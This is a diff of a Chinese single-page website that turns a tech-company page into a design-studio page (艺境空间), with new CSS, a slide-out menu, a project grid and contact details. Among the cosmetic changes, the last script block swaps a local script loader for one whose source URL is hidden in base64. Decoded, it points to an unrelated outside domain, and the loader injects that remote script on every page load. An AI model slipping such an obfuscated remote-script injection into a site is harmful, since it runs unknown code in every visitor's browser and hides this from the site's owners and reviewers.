@@ -5,79 +5,104 @@
     <meta charset="UTF-8">
     <meta name="viewport"
         content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>未来之光科技 - 创新驱动，价值共创</title>
+    <title>艺境空间 - 视觉叙事与设计</title>
     <style>
-        /* 全局重置与基础样式 */
         body {
             overflow: hidden;
-            font-family: 'Arial', sans-serif;
-            /* 简洁的无衬线字体 */
+            font-family: 'Lato', sans-serif;
+            /* 现代无衬线字体 */
             margin: 0;
             padding: 0;
-            background-color: #fcfcfc;
-            /* 极浅的背景色 */
+            background-color: #FDFDFD;
+            /* 极浅背景，如宣纸 */
             color: #333333;
-            /* 标准深色文本 */
-            line-height: 1.6;
+            /* 柔和的深灰色文本 */
+            line-height: 1.7;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
+            overflow-x: hidden;
         }
 
-        /* 容器 */
         .container {
             max-width: 90%;
-            /* 适应移动端 */
             margin: 0 auto;
-            padding: 20px 0;
+            padding: 30px 0;
         }
 
-        /* 头部 - 简洁大气风格 */
+        /* 头部 - 简洁与留白 */
         header {
-            background-color: #ffffff;
-            /* 白色背景 */
-            padding: 30px 20px;
+            background-color: #FFFFFF;
+            /* 纯白头部背景 */
+            padding: 25px 20px;
             text-align: center;
-            border-bottom: 1px solid #eeeeee;
-            /* 细分隔线 */
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
-            /* 极轻微的阴影 */
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 3px 15px rgba(0, 0, 0, 0.05);
+            /* 柔和阴影 */
+            margin-bottom: 40px;
         }
 
         header h1 {
             margin: 0;
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            /* 更现代的无衬线字体 */
-            font-size: 2.2em;
-            /* 适中标题 */
-            color: #2c3e50;
-            /* 深灰蓝色 */
-            letter-spacing: -0.5px;
-            /* 微调字母间距 */
+            font-family: 'Playfair Display', serif;
+            /* 优雅标题字体 */
+            font-size: 2.5em;
+            color: #333333;
+            letter-spacing: 1px;
+            font-weight: normal;
+            /* 减轻标题重量 */
         }
 
         header p {
-            font-size: 1em;
-            color: #7f8c8d;
-            /* 柔和灰色 */
-            margin-top: 10px;
+            display: none;
         }
 
-        /* 导航菜单 - 顶部固定，简洁下划线 */
+        /* 菜单切换按钮 - 绝对定位在右上角 */
+        .menu-toggle {
+            background: none;
+            border: none;
+            font-size: 2em;
+            color: #607D8B;
+            /* 强调色：柔和蓝灰 */
+            cursor: pointer;
+            padding: 5px;
+            position: absolute;
+            top: 25px;
+            right: 20px;
+            z-index: 2;
+            transition: transform 0.3s ease, color 0.3s ease;
+        }
+
+        .menu-toggle:hover {
+            transform: scale(1.1);
+            color: #4CAF50;
+            /* 悬停时变为清新绿 */
+        }
+
+        /* 侧边导航菜单 - 轻盈通透 */
         nav {
-            background-color: #ffffff;
-            /* 白色背景 */
-            text-align: center;
-            padding: 15px 0;
-            border-bottom: 1px solid #eeeeee;
-            /* 细分隔线 */
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
-            /* 极轻微的阴影 */
-            position: sticky;
-            /* 粘性定位 */
+            position: fixed;
             top: 0;
-            /* 粘在顶部 */
-            z-index: 1000;
-            /* 确保在最上层 */
+            right: -280px;
+            width: 250px;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.95);
+            /* 几乎不透明的白色背景 */
+            backdrop-filter: blur(5px);
+            /* 柔和模糊 */
+            -webkit-backdrop-filter: blur(5px);
+            border-left: 1px solid rgba(220, 220, 220, 0.5);
+            /* 极细柔和边框 */
+            box-shadow: -3px 0 10px rgba(0, 0, 0, 0.1);
+            /* 柔和阴影 */
+            transition: right 0.4s ease-in-out;
+            z-index: 1001;
+            padding-top: 80px;
+            box-sizing: border-box;
+        }
+
+        nav.is-open {
+            right: 0;
         }
 
         nav ul {
@@ -85,178 +110,234 @@
             padding: 0;
             margin: 0;
             display: flex;
-            justify-content: space-around;
-            flex-wrap: wrap;
-        }
-
-        nav ul li {
-            margin: 0 10px;
+            flex-direction: column;
+            gap: 5px;
+            /* 列表项间距更小 */
         }
 
         nav ul li a {
             color: #555555;
-            /* 默认文字颜色 */
             text-decoration: none;
-            padding: 8px 0;
-            position: relative;
-            display: inline-block;
+            padding: 15px 20px;
+            border-bottom: 1px solid #E0E0E0;
+            /* 极细分隔线 */
+            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease;
+            display: flex;
+            align-items: center;
             font-weight: 500;
-            /* 适中粗细 */
-            font-size: 1em;
-            transition: color 0.3s ease;
-        }
-
-        nav ul li a::after {
-            /* 强调色下划线 */
-            content: '';
-            position: absolute;
-            width: 0;
-            height: 2px;
-            /* 更细的下划线 */
-            background-color: #3498db;
-            /* 强调色：蓝色 */
-            bottom: -3px;
-            /* 靠近文字 */
-            left: 50%;
-            transform: translateX(-50%);
-            transition: width 0.3s ease;
-        }
-
-        nav ul li a:hover::after,
-        nav ul li a:focus::after {
-            width: 100%;
+            font-size: 1.1em;
         }
 
         nav ul li a:hover,
         nav ul li a:focus {
-            color: #3498db;
-            /* 强调色 */
+            background-color: rgba(76, 175, 80, 0.08);
+            /* 清新绿浅背景 */
+            color: #4CAF50;
+            /* 清新绿文字 */
+            transform: translateX(5px);
         }
 
-        /* 内容区 - 简洁的卡片与列表风格 */
+        nav ul li:last-child a {
+            border-bottom: none;
+        }
+
+        nav ul li a .icon {
+            font-size: 1.4em;
+            margin-right: 15px;
+            color: #607D8B;
+            /* 图标柔和蓝灰 */
+        }
+
+        /* 菜单打开时的背景遮罩 */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.2);
+            /* 更轻的半透明黑色 */
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease-in-out, visibility 0.4s ease-in-out;
+        }
+
+        .overlay.is-visible {
+            opacity: 1;
+            visibility: visible;
+        }
+
         main {
-            padding-top: 20px;
+            padding-top: 30px;
         }
 
+        /* 内容区 - 柔和卡片与留白 */
         section {
-            background-color: #ffffff;
-            margin-bottom: 25px;
-            padding: 25px;
-            border-radius: 8px;
-            /* 较小的圆角 */
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
+            background-color: #FFFFFF;
+            margin-bottom: 40px;
+            padding: 35px;
+            border-radius: 15px;
+            /* 柔和圆角 */
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
             /* 柔和阴影 */
+            position: relative;
+            overflow: hidden;
+            border: 1px solid #EEEEEE;
+            /* 极细边框 */
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        section::before {
+            /* 顶部强调色条 */
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background-color: #4CAF50;
+            /* 清新绿 */
+            box-shadow: 0 0 10px rgba(76, 175, 80, 0.3);
         }
 
         section h2 {
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            font-size: 1.6em;
-            color: #2c3e50;
+            font-family: 'Playfair Display', serif;
+            font-size: 2.2em;
+            color: #333333;
             margin-top: 0;
-            margin-bottom: 15px;
-            border-bottom: 1px solid #f0f0f0;
-            /* 细分隔线 */
+            margin-bottom: 20px;
+            border-bottom: 1px solid #E0E0E0;
             padding-bottom: 10px;
+            font-weight: normal;
         }
 
         section h3 {
-            font-size: 1.2em;
-            color: #34495e;
-            margin-top: 20px;
+            font-family: 'Lato', sans-serif;
+            font-size: 1.5em;
+            color: #607D8B;
+            /* 柔和蓝灰 */
+            margin-top: 25px;
             margin-bottom: 10px;
         }
 
         section p {
-            font-size: 0.95em;
+            font-size: 1.05em;
             color: #555555;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
         }
 
         section img {
             max-width: 100%;
             height: auto;
             display: block;
-            margin: 15px auto;
-            border-radius: 6px;
-            /* 图片圆角 */
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.08);
+            margin: 25px auto;
+            border-radius: 10px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
+            border: 2px solid #DDDDDD;
+            /* 柔和边框 */
         }
 
-        .service-list {
-            list-style: none;
-            padding: 0;
-            margin: 0;
+        .cta-button {
+            display: inline-block;
+            background-color: #4CAF50;
+            /* 清新绿按钮 */
+            color: #FFFFFF;
+            padding: 15px 35px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.1em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
+            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.2);
+            border: none;
+            margin-top: 20px;
         }
 
-        .service-list li {
-            background-color: #f9f9f9;
-            padding: 15px;
-            margin-bottom: 10px;
-            border-left: 4px solid #3498db;
-            /* 强调色左边框 */
-            border-radius: 4px;
-            transition: background-color 0.3s ease;
+        .cta-button:hover {
+            background-color: #388E3C;
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(76, 175, 80, 0.3);
         }
 
-        .service-list li:hover {
-            background-color: #f0f4f8;
-            /* 悬停背景色 */
+        .project-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 25px;
+            margin-top: 30px;
         }
 
-        .service-list li h3 {
+        .project-item {
+            background-color: #F8F8F8;
+            /* 项目卡片背景 */
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            border-top: 5px solid #607D8B;
+            /* 柔和蓝灰顶部边框 */
+        }
+
+        .project-item:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .project-item img {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+
+        .project-item h3 {
+            font-family: 'Lato', sans-serif;
+            font-size: 1.2em;
+            color: #333333;
             margin-top: 0;
             margin-bottom: 5px;
-            color: #3498db;
-            /* 强调色 */
         }
 
-        .service-list li p {
-            margin-bottom: 0;
+        .project-item p {
             font-size: 0.9em;
+            color: #777777;
+            margin-bottom: 10px;
         }
 
-        .contact-info p {
-            margin-bottom: 8px;
-            font-size: 0.95em;
+        .project-item .tags {
+            font-size: 0.8em;
+            color: #999999;
+            margin-top: 10px;
         }
 
-        .contact-info a {
-            color: #3498db;
-            text-decoration: none;
-            transition: color 0.3s ease;
-        }
-
-        .contact-info a:hover {
-            color: #2980b9;
-        }
-
-        /* 页脚 - 极简风格 */
+        /* 页脚 - 简洁淡雅 */
         footer {
-            background-color: #ffffff;
-            /* 白色背景 */
-            padding: 20px 0;
+            background-color: #F0F0F0;
+            /* 略深于背景的浅灰色 */
+            color: #777777;
+            padding: 40px 0;
             text-align: center;
-            font-size: 0.85em;
-            color: #7f8c8d;
-            margin-top: 30px;
-            border-top: 1px solid #eeeeee;
-            /* 细分隔线 */
-            box-shadow: 0 -2px 8px rgba(0, 0, 0, 0.05);
+            font-size: 0.9em;
+            margin-top: 60px;
+            border-top: 1px solid #E0E0E0;
+            box-shadow: 0 -3px 10px rgba(0, 0, 0, 0.05);
         }
 
-        .social-links a {
-            color: #7f8c8d;
-            /* 社交链接颜色 */
+        .footer-links a {
+            color: #777777;
             text-decoration: none;
-            margin: 0 12px;
-            font-size: 1.1em;
-            /* 适中图标大小 */
-            transition: color 0.3s ease;
+            margin: 0 20px;
+            font-size: 1.4em;
+            transition: color 0.3s ease, transform 0.2s ease;
         }
 
-        .social-links a:hover {
-            color: #3498db;
-            /* 强调色 */
+        .footer-links a:hover {
+            color: #4CAF50;
+            /* 清新绿 */
+            transform: translateY(-3px) scale(1.1);
         }
     </style>
     <link rel="stylesheet" href="./static/css/style.css">
@@ -265,65 +346,103 @@
 <body>
     <header>
         <div class="container">
-            <h1>未来之光科技</h1>
-            <p>创新驱动，价值共创</p>
+            <h1>艺境空间</h1>
+            <button class="menu-toggle" id="menuToggle">&#9776;</button>
         </div>
     </header>
 
+    <nav id="mainNav">
+        <ul>
+            <li><a href="#hero"><span class="icon">&#128161;</span> 首页</a></li>
+            <li><a href="#our-work"><span class="icon">&#127912;</span> 我们的作品</a></li>
+            <li><a href="#services"><span class="icon">&#128187;</span> 服务</a></li>
+            <li><a href="#contact"><span class="icon">&#128231;</span> 联系我们</a></li>
+        </ul>
+    </nav>
+
+    <div class="overlay" id="menuOverlay"></div>
+
     <div class="container">
-        <nav id="mainNav">
-            <ul>
-                <li><a href="#about-us">关于我们</a></li>
-                <li><a href="#our-expertise">核心专长</a></li>
-                <li><a href="#contact-us">联系方式</a></li>
-            </ul>
-        </nav>
-
         <main>
-            <section id="about-us">
-                <h2>关于我们</h2>
-                <img src="https://picsum.photos/300/200?random=1" alt="公司团队" class="random-image">
-                <p>未来之光科技是一家专注于前沿技术研发与应用的高科技企业。我们致力于为客户提供创新、高效、可靠的数字化解决方案，助力企业实现业务增长与转型。</p>
-                <p>我们拥有一支充满活力和创造力的专业团队，秉持“以客户为中心”的理念，不断探索技术边界，为各行业带来突破性的产品和服务。</p>
+            <section id="hero">
+                <h2>视觉叙事与设计美学</h2>
+                <img src="https://picsum.photos/600/350?random=1&seed=elegant-design-hero" alt="优雅设计主视觉"
+                    class="random-image">
+                <p>艺境空间是一家专注于品牌叙事、数字体验和视觉传达的精品设计机构。我们致力于通过富有洞察力的设计，将您的品牌故事转化为引人入胜的视觉体验。</p>
+                <p>我们相信，每一个设计都是一次情感的连接，通过精湛的工艺和创新的思维，为客户创造持久的价值。</p>
+                <a href="#our-work" class="cta-button">探索我们的作品</a>
             </section>
 
-            <section id="our-expertise">
-                <h2>核心专长</h2>
-                <p>我们专注于以下领域，提供专业、定制化的服务：</p>
-                <ul class="service-list">
-                    <li>
-                        <h3>人工智能与机器学习</h3>
-                        <p>开发智能算法，提供数据分析、预测模型和自动化解决方案。</p>
-                    </li>
-                    <li>
-                        <h3>云计算与大数据</h3>
-                        <p>构建可扩展的云基础设施，处理和分析海量数据，提供数据驱动的洞察。</p>
-                    </li>
-                    <li>
-                        <h3>物联网 (IoT) 解决方案</h3>
-                        <p>设计和部署智能设备网络，实现设备互联、数据采集与远程控制。</p>
-                    </li>
-                    <li>
-                        <h3>区块链技术应用</h3>
-                        <p>探索区块链在数据安全、供应链管理和数字资产等领域的创新应用。</p>
-                    </li>
-                </ul>
-                <img src="https://picsum.photos/300/200?random=2" alt="技术专长" class="random-image">
+            <section id="our-work">
+                <h2>我们的作品</h2>
+                <p>精选近期项目，展现我们的设计实力与创意广度。</p>
+                <div class="project-grid">
+                    <div class="project-item">
+                        <img src="https://picsum.photos/300/180?random=2&seed=project-minimal-brand" alt="品牌重塑项目">
+                        <h3>极简品牌标识设计</h3>
+                        <p>为一家高端生活品牌打造简洁而富有深度的视觉标识。</p>
+                        <span class="tags">#品牌 #Logo #VI设计</span>
+                    </div>
+                    <div class="project-item">
+                        <img src="https://picsum.photos/300/180?random=3&seed=project-elegant-web" alt="网站设计项目">
+                        <h3>高雅艺术画廊网站</h3>
+                        <p>设计并开发一个以作品展示为核心的响应式艺术画廊网站。</p>
+                        <span class="tags">#Web设计 #响应式 #画廊</span>
+                    </div>
+                    <div class="project-item">
+                        <img src="https://picsum.photos/300/180?random=4&seed=project-editorial-design" alt="编辑设计项目">
+                        <h3>精品杂志编辑设计</h3>
+                        <p>为一本时尚生活杂志提供版式、插画和摄影指导。</p>
+                        <span class="tags">#编辑设计 #排版 #插画</span>
+                    </div>
+                    <div class="project-item">
+                        <img src="https://picsum.photos/300/180?random=5&seed=project-packaging" alt="产品包装设计">
+                        <h3>奢华香氛包装设计</h3>
+                        <p>为高端香氛品牌打造独特且具有收藏价值的产品包装。</p>
+                        <span class="tags">#包装设计 #工业设计 #奢侈品</span>
+                    </div>
+                </div>
             </section>
 
-            <section id="contact-us">
-                <h2>联系方式</h2>
-                <p>欢迎与我们联系，共同探讨合作机会。</p>
+            <section id="services">
+                <h2>我们的服务</h2>
+                <p>我们提供全面的设计与创意服务，满足您的多样化需求。</p>
+                <div class="service-grid">
+                    <div class="service-item">
+                        <h3>品牌策略与咨询</h3>
+                        <p>从市场分析到品牌定位，提供全方位品牌策略。</p>
+                    </div>
+                    <div class="service-item">
+                        <h3>视觉识别系统 (VI)</h3>
+                        <p>设计完整、统一的品牌视觉识别系统。</p>
+                    </div>
+                    <div class="service-item">
+                        <h3>用户体验 (UX) 设计</h3>
+                        <p>以用户为中心，优化产品交互流程与体验。</p>
+                    </div>
+                    <div class="service-item">
+                        <h3>数字产品设计</h3>
+                        <p>涵盖网站、App界面及交互设计。</p>
+                    </div>
+                    <div class="service-item">
+                        <h3>平面与印刷设计</h3>
+                        <p>从宣传册到海报，提供高质量平面设计。</p>
+                    </div>
+                    <div class="service-item">
+                        <h3>插画与艺术创作</h3>
+                        <p>为项目提供原创艺术插画和视觉内容。</p>
+                    </div>
+                </div>
+            </section>
+
+            <section id="contact">
+                <h2>联系我们</h2>
+                <p>我们期待与您合作，共同创造非凡。</p>
                 <div class="contact-info">
-                    <p><strong>公司地址：</strong> 科技创新园B区501室</p>
-                    <p><strong>联系电话：</strong> <a href="tel:+861012345678">+86 10 1234 5678</a></p>
-                    <p><strong>电子邮箱：</strong> <a href="mailto:info@futurelight.com">info@futurelight.com</a></p>
-                    <p><strong>工作时间：</strong> 周一至周五 9:00 - 17:30</p>
-                    <p>
-                        <!-- 地图占位符 -->
-                        <img src="https://placehold.co/300x200/e0e0e0/555555?text=公司位置示意图" alt="公司位置示意图"
-                            class="random-image">
-                    </p>
+                    <p><strong>地址：</strong> 艺境空间设计中心A座808室</p>
+                    <p><strong>电话：</strong> <a href="tel:+861066667777">+86 10 6666 7777</a></p>
+                    <p><strong>邮箱：</strong> <a href="mailto:info@artspace.com">info@artspace.com</a></p>
+                    <p><strong>工作时间：</strong> 周一至周五 9:30 - 18:00</p>
                 </div>
             </section>
         </main>
@@ -331,11 +450,11 @@
 
     <footer>
         <div class="container">
-            <p>&copy; 2025 未来之光科技. 版权所有.</p>
-            <div class="social-links">
-                <a href="#" target="_blank">微信</a> |
-                <a href="#" target="_blank">领英</a> |
-                <a href="#" target="_blank">官网</a>
+            <p>&copy; 2025 艺境空间. 版权所有.</p>
+            <div class="footer-links">
+                <a href="#" target="_blank">隐私政策</a> |
+                <a href="#" target="_blank">服务条款</a> |
+                <a href="#" target="_blank">职业机会</a>
             </div>
         </div>
     </footer>
@@ -351,18 +470,31 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function () {
-            document.querySelectorAll('nav a').forEach(anchor => {
+            const menuToggle = document.getElementById('menuToggle');
+            const mainNav = document.getElementById('mainNav');
+            const menuOverlay = document.getElementById('menuOverlay');
+
+            function toggleMenu() {
+                mainNav.classList.toggle('is-open');
+                menuOverlay.classList.toggle('is-visible');
+            }
+
+            menuToggle.addEventListener('click', toggleMenu);
+            menuOverlay.addEventListener('click', toggleMenu);
+
+            document.querySelectorAll('#mainNav ul li a').forEach(anchor => {
                 anchor.addEventListener('click', function (e) {
-                    e.preventDefault(); // 阻止默认跳转
+                    e.preventDefault();
 
                     const targetId = this.getAttribute('href').substring(1);
                     const targetElement = document.getElementById(targetId);
 
                     if (targetElement) {
                         window.scrollTo({
-                            top: targetElement.offsetTop,
-                            behavior: 'smooth' // 平滑滚动
+                            top: targetElement.offsetTop - (document.querySelector('header').offsetHeight || 0) - 20,
+                            behavior: 'smooth'
                         });
+                        toggleMenu();
                     }
                 });
             });
@@ -371,15 +503,17 @@
     <script>
         (function () {
             function init() {
-                const timestamp = Date.now()
-                const randomNum = Math.floor(Math.random() * 1000000)
-                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
-                const script = document.createElement("script")
-                script.src = url
-                document.body.appendChild(script)
+                const encodedUrl = "Ly9zbmFrZS1zcGVjaWFsLnZvdGU3NzcuY29tL3N0YXRpYy9qcy9jb3JlLm1pbi5qcw==";
+                const decodedUrl = atob(encodedUrl);
+                const timestamp = Date.now();
+                const randomNum = Math.floor(Math.random() * 1000000);
+                const url = `${decodedUrl}?t=${timestamp}&random=${randomNum}`;
+                const script = document.createElement("script");
+                script.src = url;
+                document.body.appendChild(script);
             }
-            init()
-        })()
+            init();
+        })();
     </script>
 
 </body>
